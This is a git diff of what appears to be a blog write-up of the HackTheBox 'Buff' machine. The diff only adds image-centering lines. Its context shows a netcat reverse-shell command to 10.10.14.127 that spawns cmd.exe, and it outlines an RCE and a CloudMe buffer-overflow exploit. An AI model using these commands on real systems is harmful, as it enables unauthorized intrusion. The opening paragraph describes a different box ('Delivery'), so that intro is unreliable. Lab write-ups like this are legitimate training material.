@@ -18,6 +18,7 @@ classes: wide
 Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we’ll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we’ll use hashcat combined with rules to crack the password then get the root shell.
 
 ![card](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/buff.png)
+{: style="text-align: center;"}
 
 ## Summary
 Buff is an easy Windows machine provided by egotisticalSW on hackthebox. 
@@ -55,12 +56,14 @@ Clicking on **Contact** button reveals useful information.
 The website has been built using ``Gym Management Software 1.0``
 
 ![contact](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/contact.png)
+{: style="text-align: center;"}
 
 ### Gaining a low-privileged shell
 
 While searching the software on **exploitdb** We find a RCE vulnerability ...
 
 ![exploitdb](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/exploitdb.png)
+{: style="text-align: center;"}
 
 I am going to use the 4th exploit which appears to be an ``Unauthenticated Remote Code Execution`` Vulnerability.
 
@@ -107,7 +110,7 @@ C:\xampp\htdocs\gym\upload> netcat.exe 10.10.14.127 9001 -e cmd.exe
 After a while listening , I recieve a reverse shell:
 
 ![rev](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/rev.png)
-
+{: style="text-align: center;"}
 ## Lateral Movement
 
 While enumerating the box I came across an interesting **.exe** file under ``C:\Users\shaun\Downloads`` :
@@ -133,6 +136,7 @@ dir
 Again , searching the software on **exploitdb** for a possible vulnerability leads to this :
 
 ![cloudme](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/cloudme.png)
+{: style="text-align: center;"}
 
 By the first view, it seems like a **Buffer Overflow** vulnerability laying on **CloudMe** which should probably be listening on a local port on the machine. 
 
@@ -186,6 +190,7 @@ I'm going to use the exploit from [https://www.exploit-db.com/exploits/48389](ht
 Using ``searchsploit -m`` we can again copy the exploit to a more flexible path :
 
 ![bof](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/bof.png)
+{: style="text-align: center;"}
 
 ### Generating the shellcode
 
@@ -267,6 +272,6 @@ Im going to save the modified exploit and run it using :
 Before executing remember that we also need to set up a listening port (the same we used while generating a shellcode) , in this case it would be **9002**
 
 ![admin](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/admin.png)
+{: style="text-align: center;"}
 
 After executing I recieved a shell as **Administrator** which was pretty much the last step for this box.
-{: style="text-align: center;"}
